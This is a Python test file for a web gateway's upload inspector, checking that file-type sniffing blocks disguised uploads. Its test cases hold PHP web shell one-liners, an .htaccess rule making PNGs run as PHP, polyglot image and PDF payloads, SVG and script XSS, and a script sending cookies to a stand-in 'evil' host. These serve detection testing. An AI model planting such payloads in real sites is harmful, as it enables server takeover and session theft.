"""업로드 파일 내용 검사(multipart → 검사 필드·신호 → 판정)."""
import pytest

from conftest import rule_ids
from mpg.detection import Action
from mpg.gateway.extract import RawRequest, build_inspection
from mpg.gateway.uploads import extensions, inspect_upload, sniff

PNG = b"\x89PNG\r\n\x1a\n" + b"\x00\x00\x00\rIHDR" + bytes(64)
JPEG = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00" + bytes(64)
ELF = b"\x7fELF\x02\x01\x01" + bytes(64)


def upload(pipe, filename, content, ctype="image/png", path="/api/upload"):
    body = (b"--B\r\nContent-Disposition: form-data; name=\"file\"; filename=\"" + filename.encode() + b"\"\r\n"
            b"Content-Type: " + ctype.encode() + b"\r\n\r\n" + content + b"\r\n--B--\r\n")
    raw = RawRequest("POST", path, "", [("content-type", "multipart/form-data; boundary=B")], body)
    return pipe.inspect(build_inspection(raw))


def test_sniff_and_extensions():
    assert sniff(PNG) == "png" and sniff(JPEG) == "jpeg" and sniff(ELF) == "elf"
    assert sniff(b"<?php echo 1; ?>") == "active-text"
    assert sniff("안녕하세요".encode()) == "text"
    assert extensions("shell.php.jpg") == ["php", "jpg"]
    assert extensions("a.PHP%00.png".replace("%00", "\x00")) == ["php", "png"]
    assert extensions("C:\\fake\\.htaccess") == ["htaccess"]


@pytest.mark.parametrize("filename,content,ctype,rule", [
    ("shell.php", b"<?php system($_GET['c']); ?>", "application/octet-stream", "FILE-001"),
    ("shell.php.jpg", JPEG, "image/jpeg", "FILE-002"),
    ("avatar.png", b"<?php eval($_POST['x']); ?>", "image/png", "FILE-003"),
    ("avatar.png", b"<html><script>alert(1)</script></html>", "image/png", "FILE-003"),
    ("cat.jpg", JPEG + b"<?php system($_GET['c']); ?>", "image/jpeg", "FILE-004"),
    ("doc.pdf", b"%PDF-1.7\n" + bytes(32) + b"<script>alert(1)</script>", "application/pdf", "FILE-004"),
    (".htaccess", b"AddType application/x-httpd-php .png", "text/plain", "FILE-001"),
    ("photo.png", ELF, "image/png", "FILE-003"),
])
def test_malicious_uploads_blocked(pipe, filename, content, ctype, rule):
    v = upload(pipe, filename, content, ctype)
    assert v.action is Action.BLOCK, rule_ids(v)
    assert rule in rule_ids(v)


def test_text_file_contents_are_inspected_by_other_rules(pipe):
    v = upload(pipe, "note.html", b"<p>hi</p><script>document.location='//evil/?c='+document.cookie</script>",
               "text/html")
    assert v.action is Action.BLOCK
    assert any(m.field_ref == "multipart.file#content" for m in v.matches)
    svg = b'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><rect/></svg>'
    assert upload(pipe, "icon.svg", svg, "image/svg+xml").action is Action.BLOCK


@pytest.mark.parametrize("filename,content,ctype", [
    ("photo.png", PNG, "image/png"),
    ("사진.jpg", JPEG, "image/jpeg"),
    ("report.pdf", b"%PDF-1.7\n" + bytes(64) + b"%%EOF", "application/pdf"),
    ("notes.txt", "회의록: 다음 주 화요일 배포".encode(), "text/plain"),
    ("data.csv", b"id,name\n1,kim\n2,lee\n", "text/csv"),
    ("icon.svg", b'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z"/></svg>',
     "image/svg+xml"),
])
def test_ordinary_uploads_allowed(pipe, filename, content, ctype):
    v = upload(pipe, filename, content, ctype)
    assert v.action is not Action.BLOCK, rule_ids(v)


def test_executable_is_logged_not_blocked_by_default(pipe):
    v = upload(pipe, "tool.bin", ELF, "application/octet-stream")
    assert v.action is Action.DETECT_ONLY or "FILE-005" in rule_ids(v)
    assert "FILE-005" in rule_ids(v)
    signals, text = inspect_upload("tool.bin", "application/octet-stream", ELF)
    assert signals == {"upload_executable"} and text is None
